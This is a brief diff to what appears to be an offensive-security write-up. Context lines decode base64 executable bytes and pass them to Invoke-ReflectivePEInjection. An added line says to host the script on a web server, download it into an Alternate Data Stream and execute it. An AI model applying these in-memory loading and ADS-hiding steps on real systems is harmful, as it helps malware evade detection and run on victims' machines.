@@ -91,4 +91,6 @@ $PEBytes = [System.Convert]::FromBase64String($ExeBytes)
 Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"
 ```
 
+Now host this script on your web server and use the POC to download and embed the script into an ADS and execute or use another method.
+
 The options here are as broad and varied as your imagination.
